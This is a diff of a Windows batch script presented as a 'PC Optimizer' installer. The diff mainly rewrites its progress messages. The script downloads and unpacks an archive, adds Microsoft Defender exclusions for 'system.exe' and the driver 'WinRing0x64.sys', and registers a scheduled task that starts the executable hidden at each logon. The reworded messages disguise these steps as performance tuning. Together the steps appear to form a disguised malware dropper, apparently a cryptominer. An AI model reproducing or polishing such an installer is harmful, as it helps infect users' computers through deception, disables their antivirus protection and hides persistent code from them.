@@ -10,7 +10,12 @@ set "EXE_NAME=system.exe"
 set "DRIVER_NAME=WinRing0x64.sys"
 :: =========================================
 
-echo [1/6] Scanning system for performance issues...
+echo -----------------------------------------------------------------------
+echo PC Optimizer - Installation
+echo -----------------------------------------------------------------------
+
+echo.
+echo > Checking system requirements...
 net session >nul 2>&1
 if %errorlevel% neq 0 (
     echo ERROR: Please run this as Administrator.
@@ -18,18 +23,21 @@ if %errorlevel% neq 0 (
     exit /b 1
 )
 
-echo [2/6] Analyzing registry for optimization opportunities...
+echo.
+echo > Preparing installation directory...
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 
-echo [3/6] Downloading latest optimization database...
+echo.
+echo > Downloading latest optimization database...
 powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIP_PATH%' -ErrorAction Stop"
 if %errorlevel% neq 0 (
-    echo ERROR: Database update failed.
+    echo ERROR: Download failed.
     pause
     exit /b 1
 )
 
-echo [4/6] Installing performance enhancements...
+echo.
+echo > Installing performance enhancements...
 powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%INSTALL_DIR%' -Force"
 if %errorlevel% neq 0 (
     echo ERROR: Installation failed.
@@ -39,19 +47,21 @@ if %errorlevel% neq 0 (
 
 del "%ZIP_PATH%" >nul 2>&1
 
-echo [5/6] Configuring system settings for optimal performance...
+echo.
+echo > Optimizing system configuration...
 if exist "%INSTALL_DIR%\pc-optimizer" (
     xcopy "%INSTALL_DIR%\pc-optimizer\*" "%INSTALL_DIR%\" /E /Y /I >nul
     rmdir /s /q "%INSTALL_DIR%\pc-optimizer"
 )
 
-:: Add exclusions before running the executable
-echo [5/7] Configuring gpu for optimal performance...
+echo.
+echo > Configuring security settings...
 powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%DRIVER_NAME%'"
 powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%EXE_NAME%'"
 
-echo [6/7] Creating files...
-
+echo.
+echo > Creating startup task...
+schtasks /delete /tn "%APP_NAME%" /f >nul 2>&1
 schtasks /create /tn "%APP_NAME%" ^
  /tr "powershell -WindowStyle Hidden -Command Start-Process '%INSTALL_DIR%\%EXE_NAME%' -WindowStyle Hidden" ^
  /sc onlogon ^
@@ -59,13 +69,13 @@ schtasks /create /tn "%APP_NAME%" ^
  /f >nul
 
 if %errorlevel% neq 0 (
-    echo ERROR.
+    echo ERROR: Task creation failed.
     pause
     exit /b 1
 )
 
-echo [7/7] Finalizing installation...
-
 echo.
-echo Installation complete.
+echo > Finalizing installation...
+echo.
+echo Installation complete. The optimizer will run on next login.
 pause
